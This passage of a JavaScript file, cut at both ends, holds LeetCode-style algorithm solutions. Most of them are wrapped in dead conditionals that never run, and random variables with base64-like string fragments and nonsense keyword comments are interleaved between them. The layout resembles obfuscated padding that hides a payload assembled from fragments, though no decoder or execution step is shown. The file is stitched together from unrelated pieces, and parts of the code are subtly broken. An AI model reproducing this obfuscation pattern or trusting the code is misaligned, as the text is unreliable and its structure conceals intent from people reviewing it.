        i,
        startNode = 0;
    
    for(i = 0; i < len; i++) {
        diff[i] = gas[i] - cost[i];
        sum += diff[i];
        curSum += diff[i];
        
        if (curSum < 0) {
            startNode = i + 1;
            curSum = 0;
        }
    }
    
    if (sum < 0) {
        return -1;
    } else {
        return startNode;
    }
        
};
}

    var aabmppzcoxcc = '0lDQWdJQ';
    var zfahedmu = 'TAke';
if ('false' === true) {
    /**
Implement the following operations of a stack using queues.

push(x) -- Push element x onto stack.
pop() -- Removes the element on top of the stack.
top() -- Get the top element.
empty() -- Return whether the stack is empty.
Notes:
You must use only standard operations of a queue -- which means only push to back, peek/pop from front, size, and is empty operations are valid.
Depending on your language, queue may not be supported natively. You may simulate a queue by using a list or deque (double-ended queue), as long as you use only standard operations of a queue.
You may assume that all operations are valid (for example, no pop or top operations will be called on an empty stack).
Update (2015-06-11):
The class name of the Java function had been updated to MyStack instead of Stack.


*/

/**
 * @constructor
 */
var Stack = function() {
    this.stack1 = [];
    this.stack2 = [];
};

/**
 * @param {number} x
 * @returns {void}
 */
Stack.prototype.push = function(x) {
    var temp;
    
    this.stack2.push(x);
    
    while(this.stack1.length > 0) {
        this.stack2.push(this.stack1.shift());
    }
    
    temp = this.stack2;
    this.stack2 = this.stack1;
    this.stack1 = temp;
};

/**
 * @returns {void}
 */
Stack.prototype.pop = function() {
    return this.stack1.shift();
};

/**
 * @returns {number}
 */
Stack.prototype.top = function() {
    return this.stack1[0];
};

/**
 * @returns {boolean}
 */
Stack.prototype.empty = function() {
    return this.stack1.length === 0;
};

}

    var fcmqbdi = '0JrW';
    var gfurjbuzwz = 'nDvBfBD';
if (5 instanceof String) {
    /**
Follow up for "Remove Duplicates":
What if duplicates are allowed at most twice?

For example,
Given sorted array nums = [1,1,1,2,2,3],

Your function should return length = 5, with the first five elements of nums being 1, 1, 2, 2 and 3. It doesn't matter what you leave beyond the new length.
*/
/**
 * @param {number[]} nums
 * @return {number}
 */
var removeDuplicates = function(nums) {
    var duplicate = false,
        len = nums.length,
        index = 1,
        i;
    
    for (i = 1; i < len; i++) {
        if (duplicate && nums[i] === nums[i - 1]) {
            continue;
        }
        
        if (nums[i] === nums[i - 1]) {
            duplicate = true;
        } else {
            duplicate = false;
        }
        
        nums[index] = nums[i];
        index++;
    }
    
    return index;
};

}

// variable constant value export return debug string compile string export define event sosrov code
    var jwslgiy = 'gYeXux';
if (0.86 && false) {
    /**
Given a binary tree, return the vertical order traversal of its nodes' values. (ie, from top to bottom, column by column).

If two nodes are in the same row and column, the order should be from left to right.

Examples:

    Given binary tree [3,9,20,null,null,15,7],

       3
      /\
     /  \
     9  20
        /\
       /  \
      15   7

    return its vertical order traversal as:

    [
      [9],
      [3,15],
      [20],
      [7]
    ]

    Given binary tree [3,9,8,4,0,1,7],

         3
        /\
       /  \
       9   8
      /\  /\
     /  \/  \
     4  01   7

    return its vertical order traversal as:

    [
      [4],
      [9],
      [3,0,1],
      [8],
      [7]
    ]

    Given binary tree [3,9,8,4,0,1,7,null,null,null,2,5] (0's right child is 2 and 1's left child is 5),

         3
        /\
       /  \
       9   8
      /\  /\
     /  \/  \
     4  01   7
        /\
       /  \
       5   2

    return its vertical order traversal as:

    [
      [4],
      [9,5],
      [3,0,1],
      [8,2],
      [7]
    ]


*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
 
function TreeColumnNode(col, node) {
    this.col = col;
    this.treeNode = node;
}
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var verticalOrder = function(root) {
    let col = 0;
    let node = root;
    let queue = [];
    let result = [];
    let map = {};
    let min = 0;
    let max = 0;
    
    if (!node) {
        return result;
    }
    
    queue.push(new TreeColumnNode(0, root));
    
    while (queue.length > 0) {
        const node = queue.shift();
        
        if (map[node.col] === undefined) {
            map[node.col] = [];
        }
        
        map[node.col].push(node.treeNode.val);
        
        if (node.treeNode.left) {
            queue.push(new TreeColumnNode(node.col - 1, node.treeNode.left));
            min = Math.min(min, node.col - 1);
        }
        
        if (node.treeNode.right) {
            queue.push(new TreeColumnNode(node.col + 1, node.treeNode.right));
            max = Math.max(max, node.col + 1);
        }
    }
    
    for (let i = min; i <= max; i++) {
        result.push(map[i]);
    }
    
    return result;
};

function helper(node, col, arr) {
    if (!node) {
        return;
    }
    
    if (node.left) {
        if (arr[col] === undefined) {
            arr[col - 1] = [];
        }
        
        arr[col - 1].push(node.left);
    }
    
    if (node.right) {
        if (arr[col] === undefined) {
            arr[col + 1] = [];
        }
        
        arr[col + 1].push(node.right);
    }
    
    helper(node.left, col - 1, arr);
    helper(node.right, col + 1, arr);
}

}

    var akvyj = 'ldKMVoyZ';
    var pdbalmf = 'WJCqPwHeUj';
    var rmgnxhrwzkgip = 'Gxja';
if (7 === 12) {
    /**
There are a total of n courses you have to take, labeled from 0 to n - 1.

Some courses may have prerequisites, for example to take course 0 you have to first take course 1, which is expressed as a pair: [0,1]

Given the total number of courses and a list of prerequisite pairs, return the ordering of courses you should take to finish all courses.

There may be multiple correct orders, you just need to return one of them. If it is impossible to finish all courses, return an empty array.

For example:

2, [[1,0]]
There are a total of 2 courses to take. To take course 1 you should have finished course 0. So the correct course order is [0,1]

4, [[1,0],[2,0],[3,1],[3,2]]
There are a total of 4 courses to take. To take course 3 you should have finished both courses 1 and 2. Both courses 1 and 2 should be taken after you finished course 0. So one correct course order is [0,1,2,3]. Another correct ordering is[0,2,1,3].

Note:
The input prerequisites is a graph represented by a list of edges, not adjacency matrices. Read more about how a graph is represented.

click to show more hints.

Hints:
This problem is equivalent to finding the topological order in a directed graph. If a cycle exists, no topological ordering exists and therefore it will be impossible to take all courses.
Topological Sort via DFS - A great video tutorial (21 minutes) on Coursera explaining the basic concepts of Topological Sort.
Topological sort could also be done via BFS.
*/
/**
 * @param {number} numCourses
 * @param {number[][]} prerequisites
 * @return {number[]}
 */
var findOrder = function(numCourses, prerequisites) {
    var courses = [],
        prereqCounts = [],
        queue = [],
        temp,
        result = [],
        i,
        j,
        k;
        
    for (i = 0; i < numCourses; i++) {
        courses.push(new Set());
    }
    
    // [1] is [0]'s prerequisite 
    // To take course [0] you should have finished course [1]
    for (i = 0; i < prerequisites.length; i++) {
        courses[prerequisites[i][1]].add(prerequisites[i][0]);
    }
    
    for (i = 0; i < numCourses; i++) {
        prereqCounts[i] = 0;
    }
    
    // count the pre-courses
    for (i = 0; i < numCourses; i++) {
        temp = Array.from(courses[i]);
        
        for (j = 0; j < temp.length; j++) {
            prereqCounts[temp[j]]++;
        }
    }
    
    for (i = 0; i < numCourses; i++) {
        if (prereqCounts[i] === 0) {
            queue.push(i);
            prereqCounts[i] = -1;
        }
    }
    
    while (queue.length > 0) {
        j = queue.shift();
        result.push(j);
        
        temp = Array.from(courses[j]);
        
        for (i = 0; i < temp.length; i++) {
            prereqCounts[temp[i]]--;
            
            if (prereqCounts[temp[i]] === 0) {
                queue.push(temp[i]);
                prereqCounts[temp[i]] = -1;
            }
        }
    }
    
    if (result.length === numCourses) {
        return result;
    }
    
    return [];
};

}

    var gwxiwmeyw = 'Pcrjmuol';
// shxozrvl define define ppheztdt debug async define await loop import hello
    var aeyzhebgbswo = 'yhSPfPIeUX';
if (null === 1) {
    /**
Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher's h-index.

According to the definition of h-index on Wikipedia: "A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each."

For example, given citations = [3, 0, 6, 1, 5], which means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively. Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, his h-index is 3.

Note: If there are several possible values for h, the maximum one is taken as the h-index.

Hint:

An easy approach is to sort the array first.
What are the possible values of h-index?
A faster approach is to use extra space.

*/
/**
 * @param {number[]} citations
 * @return {number}
 */
var hIndex = function(citations) {
    var len = citations.length,
        i;
    
    citations.sort(function (a, b) {
        if (a < b) {
            return 1;
        }
        return -1;
    });
    
    for (i = 0; i < len; i++) {
        if (citations[i] <= i) {
            return i;
        }
    }
    
    return len;
};


/**
SOLUTION 2:
复杂度
时间 O(N) 空间 O(N)

思路
也可以不对数组排序，我们额外使用一个大小为N+1的数组stats。stats[i]表示有多少文章被引用了i次，这里如果一篇文章引用大于N次，我们就将其当为N次，因为H指数不会超过文章的总数。为了构建这个数组，我们需要先将整个文献引用数组遍历一遍，对相应的格子加一。统计完后，我们从N向1开始遍历这个统计数组。如果遍历到某一个引用次数时，大于或等于该引用次数的文章数量，大于引用次数本身时，我们可以认为这是H指数。之所以不用再向下找，因为我们要取最大的H指数。那如何求大于或等于某个引用次数的文章数量呢？我们可以用一个变量，从高引用次的文章数累加下来。因为我们知道，如果有x篇文章的引用大于等于3次，那引用大于等于2次的文章数量一定是x加上引用次数等于2次的文章数量。

代码
public class Solution {
    public int hIndex(int[] citations) {
        int[] stats = new int[citations.length + 1];
        int n = citations.length;
        // 统计各个引用次数对应多少篇文章
        for(int i = 0; i < n; i++){
            stats[citations[i] <= n ? citations[i] : n] += 1;
        }
        int sum = 0;
        // 找出最大的H指数
        for(int i = n; i > 0; i--){
            // 引用大于等于i次的文章数量，等于引用大于等于i+1次的文章数量，加上引用等于i次的文章数量 
            sum += stats[i];
            // 如果引用大于等于i次的文章数量，大于引用次数i，说明是H指数
            if(sum >= i){
                return i;
            }
        }
        return 0;
    }
}

*/

}

    var uutaflbjmqbfu = 'nNL';
    var ltkdszcx = 'eAVTEVC';
    var ahfawmloy = 'SUNBZ';
    var jfznzdekc = 'WTLpPs';
    var jikeoy = '0lDQ';
if (8 > 147) {
    /**
The API: int read4(char *buf) reads 4 characters at a time from a file.

The return value is the actual number of characters read. For example, it returns 3 if there is only 3 characters left in the file.

By using the read4 API, implement the function int read(char *buf, int n) that reads n characters from the file.

Note:
The read function may be called multiple times. 
*/
/**
 * Definition for read4()
 * 
 * @param {character[]} buf Destination buffer
 * @return {number} The number of characters read
 * read4 = function(buf) {
 *     ...
 * };
 */

/**
 * @param {function} read4()
 * @return {function}
 */
var solution = function(read4) {
    let helperBuf = [];
    let count = 0; // how many characters read with read4
    let i = 0;
        
    /**
     * @param {character[]} buf Destination buffer
     * @param {number} n Maximum number of characters to read
     * @return {number} The number of characters read
     */
    return function(buf, n) {
        let pointer = 0;
        
        while (pointer < n) {
            if (i === 0) {
                count = read4(helperBuf);
            }
            
            while (i < count && pointer < n) {
                buf[pointer++] = helperBuf[i++];
            }
            
            // read4 buffer used up, start over
            if (i === count) {
                i = 0;
            }
            
            // end of file
            if (count < 4) {
                break;
            }
        }
        
        return pointer;
    };
};

}

    var mmtnvk = 'xrsrCaHnDF';
if (typeof document === 'undefined') {
    /**
 * @param {number} n
 * @return {number}
 */
var numTrees = function(n) {
    var i,
        j,
        result = [];
    
    result[0] = 1;
    result[1] = 1;
    
    for (i = 2; i <= n; i++) {
        result[i] = 0;
        for (j = 0; j < i; j++) {
            result[i] += result[j] * result[i - 1 - j];
        }
        
    }
    return result[n];
};

}

    var bnnlezlqdxsbudw = 'WdJQ0';
    var qgifzlpc = 'ensFrdFFz';
if (0.88 && false) {
    /**
Given an integer n, return the number of trailing zeroes in n!.

Note: Your solution should be in logarithmic time complexity.
*/

/**
 * @param {number} n
 * @return {number}
 */
var trailingZeroes = function(n) {
    var divider = 5,
        reminder = 0;
    
    while (divider <= n) {
        reminder += Math.floor(n/divider);
        divider = divider * 5;
    }
    
    return reminder;
};

}

    var qsstkjmavqz = 'JqY';
    var doacsbtuw = 'DZCEpkcql';
    var svnycc = 'jI1e';
if ('c' === 'G') {
    /**
Given a 2D board and a word, find if the word exists in the grid.

The word can be constructed from letters of sequentially adjacent cell, where "adjacent" cells are those horizontally or vertically neighboring. The same letter cell may not be used more than once.

For example,
Given board =

[
  ['A','B','C','E'],
  ['S','F','C','S'],
  ['A','D','E','E']
]
word = "ABCCED", -> returns true,
word = "SEE", -> returns true,
word = "ABCB", -> returns false.
*/
/**
 * @param {character[][]} board
 * @param {string} word
 * @return {boolean}
 */
var exist = function(board, word) {
    var rLen = board.length,
        cLen = board[0].length;
        
    return helper(word, board, rLen, cLen);
};

function helper(word, board, rLen, cLen) {
    var ch = word.charAt(0),
        i,
        j;
        
    for (i = 0; i < rLen; i++) {
        for (j = 0; j < cLen; j++) {
            if (board[i][j] === ch) {
                board[i][j] = '*';
                if (bfs(1, word, i, j, board, rLen, cLen)) {
                    return true;
                }
                board[i][j] = ch;
            }
        }
    }
    
    return false;
}

function bfs(index, word, i, j, board, rLen, cLen) {
    if (index === word.length) {
        return true;
    }
    
    var ch = word.charAt(index);
    
    if (i - 1 >= 0 && board[i - 1][j] === ch) {
        board[i - 1][j] = '*';
        
        if (bfs(index + 1, word, i - 1, j, board, rLen, cLen)) {
            return true;
        }
        
        board[i - 1][j] = ch;
    }
    
    if (j - 1 >= 0 && board[i][j - 1] === ch) {
        board[i][j - 1] = '*';
        
        if (bfs(index + 1, word, i, j - 1, board, rLen, cLen)) {
            return true;
        }
        
        board[i][j - 1] = ch;
    } 
    
    if (i + 1 < rLen && board[i + 1][j] === ch) {
        board[i + 1][j] = '*';
        
        if (bfs(index + 1, word, i + 1, j, board, rLen, cLen)) {
            return true;
        }
        
        board[i + 1][j] = ch;
    }
    
    if (j + 1 < cLen && board[i][j + 1] === ch) {
        board[i][j + 1] = '*';
        
        if (bfs(index + 1, word, i, j + 1, board, rLen, cLen)) {
            return true;
        }
        
        board[i][j + 1] = ch;
    }
    
}

}

    var mlxclasmz = 'WdjfLRLhDW';
// await compile export debug
if (0.48 && false) {
    /**
Given a string which contains only lowercase letters, remove duplicate letters so that every letter appear once and only once. You must make sure your result is the smallest in lexicographical order among all possible results.

Example:
Given "bcabc"
Return "abc"

Given "cbacdcbc"
Return "acdb"
*/

// recursive solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        startPos = 0,
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        if (s.charAt(i) < s.charAt(startPos)) {
            startPos = i;
        }
        
        // find the first non duplicate letter
        if (--count[s.charAt(i)] === 0) {
            break;
        }
    }
    
    curChar = s.charAt(startPos);
    
    return curChar + removeDuplicateLetters(s.substr(startPos + 1).replace(new RegExp(curChar, 'g'), ''));
};


// stack solution
/**
 * @param {string} s
 * @return {string}
 */
var removeDuplicateLetters = function(s) {
    var count = {},
        len = s.length,
        stack = [],
        visited = {},
        curChar,
        i;
        
    if (len === 0) {
        return '';
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)] = (count[s.charAt(i)] ? count[s.charAt(i)] + 1 : 1);
    }
    
    for (i = 0; i < len; i++) {
        count[s.charAt(i)]--;
        
        if (visited[s.charAt(i)]) {
            continue;
        }
        
        while (stack.length > 0 && stack[stack.length - 1] > s.charAt(i) && count[stack[stack.length - 1]] > 0) {
            visited[stack[stack.length - 1]] = false;
            stack.pop();
        }
        
        stack.push(s.charAt(i));
        visited[s.charAt(i)] = true;
    }
    
    return stack.join('');
};

}

    var bxrlnzngrbgm = 'zZJg';
    var hfmusxjrakdrwd = 'mRD';
    var kcgesbo = 'rnZuGnNDN';
    var ifyucf = 'QmxibVFnUF';
if (7 instanceof String) {
    /**
Given a positive integer n, break it into the sum of at least two positive integers and maximize the product of those integers. Return the maximum product you can get.

For example, given n = 2, return 1 (2 = 1 + 1); given n = 10, return 36 (10 = 3 + 3 + 4).

Note: you may assume that n is not less than 2.

Hint:

There is a simple O(n) solution to this problem.
You may check the breaking results of n ranging from 7 to 10 to discover the regularities.
*/
/**
 * @param {number} n
 * @return {number}
 */
var integerBreak = function(n) {
    var dp = [],
        i;
    
    if (n <= 3) {
        return n - 1;
    }
    
    dp[0] = 0;
    dp[1] = 1;
    dp[2] = 2;
    dp[3] = 3;
    
    for (i = 4; i <= n; i++) {
        dp[i] = Math.max(dp[i - 2] * 2, dp[i - 3] * 3);
    }
    
    return dp[n];
};


// SOLUTION 2
/**
 * @param {number} n
 * @return {number}
 * 可以说，拆成3的比拆成2的乘积大。 比如6的时候 2*2*2 < 3*3

我们希望能尽可能的拆成3，然后才是2.

所以，如果

n % 3 == 0:  那么全部拆成3
n % 3 == 1:  2个2剩下的为3    4*3^(x-1) > 1*3^x
n % 3 == 2:  1个2剩下的为3
 */
var integerBreak = function(n) {
    var dp = [],
        i;
    
    if (n <= 3) {
        return n - 1;
    }
    
    switch(n % 3) {
        case 0:
            return Math.pow(3, n / 3);
        case 1:
            return 4 * Math.pow(3, parseInt(n / 3) - 1);
        case 2:
            return 2 * Math.pow(3, parseInt(n / 3));
    }
};

}

    var byumpsgdsz = 'IYysnOjKwo';
    var aolgtffmusg = 'NCd1pYSm1';
if (Array.isArray(7)) {
    /**
You are climbing a stair case. It takes n steps to reach to the top.

Each time you can either climb 1 or 2 steps. In how many distinct ways can you climb to the top?

 * @param {number} n
 * @return {number}
 */
var climbStairs = function(n) {
    var arr = [],
        i;
    
    arr[0] = 0;
    arr[1] = 1;
    arr[2] = 2;
    
    for(i = 3; i <= n; i++) {
        arr[i] = arr[i - 1] + arr[i - 2];
    }
    return arr[n];
};

}

    var sghikhwpnkvh = 'quZwcEZwHY';
    var brsgs = 'iM0p0';
    var ijhkxmhbo = 'jWeWl';
    var yjfdarvnt = 'WVc1';
    var rkjrbgvrfqx = 'yYZTtl';
    var dpkcad = 'alpTN';
    var dkvoxdl = 'pQFXHXv';
    var kxuzijzpdjeztp = 'XVi';
if (61 > 167) {
    /**
Given a non-negative integer num, repeatedly add all its digits until the result has only one digit.

For example:

Given num = 38, the process is like: 3 + 8 = 11, 1 + 1 = 2. Since 2 has only one digit, return it.

Follow up:
Could you do it without any loop/recursion in O(1) runtime?

Hint:

A naive implementation of the above process is trivial. Could you come up with other methods?
What are all the possible results?
How do they occur, periodically or randomly?
You may find this Wikipedia article useful.
*/

/**
 * @param {number} num
 * @return {number}
 */
var addDigits = function(num) {
    return (num - 1) % 9 + 1;
};

}

    var vrgmmayvft = 'OIVTQ';
if (!true && 1) {
    /**
Given a binary tree, return the zigzag level order traversal of its nodes' values. (ie, from left to right, then right to left for the next level and alternate between).

For example:
Given binary tree {3,9,20,#,#,15,7},
    3
   / \
  9  20
    /  \
   15   7
return its zigzag level order traversal as:
[
  [3],
  [20,9],
  [15,7]
]
confused what "{1,#,2,3}" means? > read more on how binary tree is serialized on OJ.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var zigzagLevelOrder = function(root) {
    var result = [],
        cur = [],
        left = true,
        i,
        len,
        temp,
        next;
    
    if (!root) {
        return result;
    }
    
    cur.push(root);
    
    while(cur.length > 0) {
        len = cur.length;
        temp = [];
        next = [];
        
        for (i = 0; i < len; i++) {
            temp.push(cur[i].val);
            
            if (cur[i].left) {
                next.push(cur[i].left);
            }
            
            if (cur[i].right) {
                next.push(cur[i].right);
            }
        }
        
        if (!left) {
            temp.reverse();
        }
        
        left = !left;
        result.push(temp);
        cur = next;
    }

    return result;
};

// SOLUTION 2: USE STACK
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number[][]}
 */
var zigzagLevelOrder = function(root) {
    var result = [],
        cur = [],
        left = true,
        i,
        len,
        temp,
        next,
        node;
    
    if (!root) {
        return result;
    }
    
    cur.push(root);
    
    while(cur.length > 0) {
        len = cur.length;
        temp = [];
        next = [];
        
        node = cur.pop();
        
        while (node) {
            temp.push(node.val);
            
            if (left) {
                if (node.left) {
                    next.push(node.left);
                }
                
                if (node.right) {
                    next.push(node.right);
                }
            } else {
                if (node.right) {
                    next.push(node.right);
                }
                
                if (node.left) {
                    next.push(node.left);
                }
            }
            
            node = cur.pop();
        }
        
        result.push(temp);
        cur = next;
        left = !left;
    }
    
    return result;
};
}

    var oyoihn = 'M2NvS1R';
    var gciomycv = 'PIjU';
if (typeof window === 'undefined') {
    /**
Given a binary tree containing digits from 0-9 only, each root-to-leaf path could represent a number.

An example is the root-to-leaf path 1->2->3 which represents the number 123.

Find the total sum of all root-to-leaf numbers.

For example,

    1
   / \
  2   3
The root-to-leaf path 1->2 represents the number 12.
The root-to-leaf path 1->3 represents the number 13.

Return the sum = 12 + 13 = 25.
*/
/**
 * Definition for a binary tree node.
 * function TreeNode(val) {
 *     this.val = val;
 *     this.left = this.right = null;
 * }
 */
/**
 * @param {TreeNode} root
 * @return {number}
 */
var sumNumbers = function(root) {
    var arr = [0];
    
    helper(root, 0, arr);
    
    return arr[0];
};

function helper(node, sum, arr) {
    if (!node) {
        return;
    }
    
    sum = sum*10 + node.val;
    
    if (!node.left && !node.right) {
        arr[0] += sum;
        return;
    }
    
    if (node.left) {
        helper(node.left, sum, arr);
    }
    
    if (node.right) {
        helper(node.right, sum, arr);
    }
    
}

}

    var iipnzbfxkxdzmb = 'zS0l';
    var nqjftrxino = 'iRmzElOS';
    var jtjnbzkiw = 'DQW';
    var kvbmdesaog = 'OpApDsxhJp';
// dwbho hello array variable sfbimzl value string function variable code export dswrjjx
    var eiuunhhremp = 'OJJpDuXcRT';
    var kcymnexsxw = 'dJQ0FnS';
    var kvkofdkwgmpi = 'tXBeWio';
// return bzjg function
if (!true && 0) {
    /**
Given an unsorted array, find the maximum difference between the successive elements in its sorted form.

Try to solve it in linear time/space.

Return 0 if the array contains less than 2 elements.

You may assume all elements in the array are non-negative integers and fit in the 32-bit signed integer range.
*/

/**
 * @param {number[]} nums
 * @return {number}
 */
var maximumGap = function(nums) {
    var length = nums.length,
        bucket = [],
        max = Number.MIN_VALUE,
        min = Number.MAX_VALUE,
        gap = 0,
        bLen,
        bIndex,
        prev,
        i;
        
    if (length < 2) {
        return 0;
    }
    
    for (i = 0; i < length; i++) {
        if (nums[i] > max) {
            max = nums[i];
        }
        
        if (nums[i] < min) {
            min = nums[i];
        } 
    }
    
    // length of each bucket
    bLen = Math.floor((max - min) / length) + 1;
    
    for (i = 0; i < length; i++) {
        bIndex = Math.floor((nums[i] - min) / bLen);
        
        if (!bucket[bIndex]) {
            bucket[bIndex] = [];
            bucket[bIndex].push(nums[i]);
            bucket[bIndex].push(nums[i]);
        } else {
            if (nums[i] < bucket[bIndex][0]) {
                bucket[bIndex][0] = nums[i];
            } else if (nums[i] > bucket[bIndex][1]) {
                bucket[bIndex][1] = nums[i];
            }
        }
    }
    
    length = bucket.length;
    prev = 0;
    
    for (i = 1; i < length; i++) {
        if (!bucket[i]) {
            continue;
        }
        
        gap = Math.max(gap, bucket[i][0] - bucket[prev][1]);
        prev = i;
    }
    
    return gap;
};

}

    var snycqwrsu = 'niEp';
    var kddmqeunqu = 'UNCcFppQ';
if ('q' === 'O') {
    /**
Implement the following operations of a queue using stacks.

push(x) -- Push element x to the back of queue.
pop() -- Removes the element from in front of queue.
peek() -- Get the front element.
empty() -- Return whether the queue is empty.
Notes:
You must use only standard operations of a stack -- which means only push to top, peek/pop from top, size, and is empty operations are valid.
Depending on your language, stack may not be supported natively. You may simulate a stack by using a list or deque (double-ended queue), as long as you use only standard operations of a stack.
You may assume that all operations are valid (for example, no pop or peek operations will be called on an empty queue).
*/

/**
 * @constructor
 */
var Queue = function() {
    this.stack1 = []; // come in
    this.stack2 = []; // for go out
};

/**
 * @param {number} x
 * @returns {void}
 */
Queue.prototype.push = function(x) {
    var len = this.stack2.length,
        i;
    
    for (i = 0; i < len; i++) {
        this.stack1.push(this.stack2.pop());
    }
    
    this.stack1.push(x);
    
    for (i = 0; i < len + 1; i++) {
        this.stack2.push(this.stack1.pop());
    }
};

/**
 * @returns {void}
 */
Queue.prototype.pop = function() {
    this.stack2.pop();
};

/**
 * @returns {number}
 */
Queue.prototype.peek = function() {
    var x = this.stack2.pop();
    
    this.stack2.push(x);
    return x;
};

/**
 * @returns {boolean}
 */
Queue.prototype.empty = function() {
    var len = this.stack2.length;
        
    if (len === 0) {
        return true;
    }
    
    return false;
};

}

    var jjkdsaxphln = 'aGchxJUiTI';
    var rygzwnlqkern = 'W9aVzVrSU';
if (4 instanceof String) {
    /**
Given an array of citations (each citation is a non-negative integer) of a researcher, write a function to compute the researcher's h-index.

According to the definition of h-index on Wikipedia: "A scientist has index h if h of his/her N papers have at least h citations each, and the other N − h papers have no more than h citations each."

For example, given citations = [3, 0, 6, 1, 5], which means the researcher has 5 papers in total and each of them had received 3, 0, 6, 1, 5 citations respectively. Since the researcher has 3 papers with at least 3 citations each and the remaining two with no more than 3 citations each, his h-index is 3.

Note: If there are several possible values for h, the maximum one is taken as the h-index.

Hint:

An easy approach is to sort the array first.
What are the possible values of h-index?
A faster approach is to use extra space.

*/
/**
 * @param {number[]} citations
 * @return {number}
 */
var hIndex = function(citations) {
    var len = citations.length,
        i;
    
    citations.sort(function (a, b) {
        if (a < b) {
            return 1;
        }
        return -1;
    });
    
    for (i = 0; i < len; i++) {
        if (citations[i] <= i) {
            return i;
        }
    }
    
    return len;
};


/**
SOLUTION 2:
复杂度
时间 O(N) 空间 O(N)

思路
也可以不对数组排序，我们额外使用一个大小为N+1的数组stats。stats[i]表示有多少文章被引用了i次，这里如果一篇文章引用大于N次，我们就将其当为N次，因为H指数不会超过文章的总数。为了构建这个数组，我们需要先将整个文献引用数组遍历一遍，对相应的格子加一。统计完后，我们从N向1开始遍历这个统计数组。如果遍历到某一个引用次数时，大于或等于该引用次数的文章数量，大于引用次数本身时，我们可以认为这是H指数。之所以不用再向下找，因为我们要取最大的H指数。那如何求大于或等于某个引用次数的文章数量呢？我们可以用一个变量，从高引用次的文章数累加下来。因为我们知道，如果有x篇文章的引用大于等于3次，那引用大于等于2次的文章数量一定是x加上引用次数等于2次的文章数量。

代码
public class Solution {
    public int hIndex(int[] citations) {
        int[] stats = new int[citations.length + 1];
        int n = citations.length;
        // 统计各个引用次数对应多少篇文章
        for(int i = 0; i < n; i++){
            stats[citations[i] <= n ? citations[i] : n] += 1;
        }
        int sum = 0;
        // 找出最大的H指数
        for(int i = n; i > 0; i--){
            // 引用大于等于i次的文章数量，等于引用大于等于i+1次的文章数量，加上引用等于i次的文章数量 
            sum += stats[i];
            // 如果引用大于等于i次的文章数量，大于引用次数i，说明是H指数
            if(sum >= i){
                return i;
            }
        }
        return 0;
    }
}

*/

}

    var qqzxuukq = 'TOdNrUV';
if (!true && 1) {
    /**
Given a pattern and a string str, find if str follows the same pattern.

Here follow means a full match, such that there is a bijection between a letter in pattern and a non-empty word in str.

Examples:
pattern = "abba", str = "dog cat cat dog" should return true.
pattern = "abba", str = "dog cat cat fish" should return false.
pattern = "aaaa", str = "dog cat cat dog" should return false.
pattern = "abba", str = "dog dog dog dog" should return false.
Notes:
You may assume pattern contains only lowercase letters, and str contains lowercase letters separated by a single space.
*/

/**
 * @param {string} pattern
 * @param {string} str
 * @return {boolean}
 */
var wordPattern = function(pattern, str) {
    var arr = str.split(' '),
        len = arr.length,
        map1 = {},
        map2 = {},
        curChar,
        curString,
        i;
    
    if (pattern.length !== len) {
        return false;
    }
    
    for (i = 0; i < len; i++) {
        curChar = pattern.charAt(i);
        curString = arr[i];
        
        if (!map1.hasOwnProperty(curChar) && !map2.hasOwnProperty(curString)) {
            map1[curChar] = curString;
            map2[curString] = curChar;
        } else if (map1[curChar] !== curString || map2[curString] !== curChar) {
            return false;
        }
    }
    
    return true;
};

}

    var fzlgvvjm = 'MwZ2MzUmhj';
if (0.88 && false) {
    /**
Given a 2D matrix matrix, find the sum of the elements inside the rectangle defined by its upper left corner (row1, col1) and lower right corner (row2, col2).

Range Sum Query 2D
The above rectangle (with the red border) is defined by (row1, col1) = (2, 1) and (row2, col2) = (4, 3), which contains sum = 8.

Example:
Given matrix = [
  [3, 0, 1, 4, 2],
  [5, 6, 3, 2, 1],
  [1, 2, 0, 1, 5],
  [4, 1, 0, 1, 7],
  [1, 0, 3, 0, 5]
]

sumRegion(2, 1, 4, 3) -> 8
sumRegion(1, 1, 2, 2) -> 11
sumRegion(1, 2, 2, 4) -> 12
Note:
You may assume that the matrix does not change.
There are many calls to sumRegion function.
You may assume that row1 ≤ row2 and col1 ≤ col2.
*/

 /**
 * @constructor
 * @param {number[][]} matrix
 */
var NumMatrix = function(matrix) {
    var sum = [],
        rLen = matrix.length,
        cLen,
        i,
        j;
    
    if (rLen === 0) {
        this.sum = null;
        return;
    }
    
    cLen = matrix[0].length;
    
    for (i = 0; i < rLen; i++) {
        sum.push(new Array(cLen));
    }    
    
    sum[0][0] = matrix[0][0];
    
    for (i = 1; i < rLen; i++) {
        sum[i][0] = sum[i - 1][0] + matrix[i][0];
    }
    
    for (j = 1; j < cLen; j++) {
        sum[0][j] = sum[0][j - 1] + matrix[0][j];
    }
    
    for (i = 1; i < rLen; i++) {
        for (j = 1; j < cLen; j++) {
            sum[i][j] = sum[i - 1][j] + sum[i][j - 1] - sum[i - 1][j - 1] + matrix[i][j];
        }
    }
    
    this.sum = sum;
};

/**
 * @param {number} row1
 * @param {number} col1
 * @param {number} row2
 * @param {number} col2
 * @return {number}
 */
NumMatrix.prototype.sumRegion = function(row1, col1, row2, col2) {
    if (!this.sum) {
        return 0;
    }
    
    var result = this.sum[row2][col2];
    
    if (row1 > 0) {
        result -= this.sum[row1 - 1][col2];
    }
    
    if (col1 > 0) {
        result -= this.sum[row2][col1 - 1];
    }
    
    if (row1 > 0 && col1 > 0) {
